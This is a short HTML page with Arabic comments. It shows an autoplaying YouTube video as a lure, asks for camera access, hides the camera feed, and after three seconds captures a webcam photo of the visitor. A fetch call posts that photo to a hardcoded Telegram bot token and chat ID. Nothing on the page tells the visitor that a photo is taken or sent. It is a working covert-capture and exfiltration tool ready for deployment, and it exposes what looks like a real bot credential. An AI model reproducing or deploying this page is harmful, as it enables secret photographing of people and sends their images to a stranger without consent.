<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>التقاط صورة وتشغيل فيديو</title>
  <style>
    body { margin: 0; padding: 0; text-align: center; background: #111; color: white; }
    iframe { width: 100%; height: 300px; border: none; margin-bottom: 10px; }
    video { display: none; } /* نخفي الفيديو */
  </style>
</head>
<body>

  <iframe src="https://www.youtube.com/embed/vaP0ZdA-KHo?autoplay=1&mute=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
  
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
    const CHAT_ID = '6036900535';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // طلب إذن الكاميرا
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        // انتظر قليلًا حتى تعمل الكاميرا
        setTimeout(() => {
          // إعداد الكانفس بحجم الفيديو
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          // التقاط صورة
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.jpg');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: 'POST',
              body: formData
            }).then(() => {
              console.log('تم إرسال الصورة بنجاح');
            }).catch(err => {
              console.error('فشل الإرسال:', err);
            });

          }, 'image/jpeg', 0.9);

        }, 3000); // وقت الانتظار قبل التقاط الصورة (3 ثوانٍ)
      })
      .catch(err => {
        console.error('خطأ في الوصول إلى الكاميرا:', err);
      });
  </script>

</body>
</html>
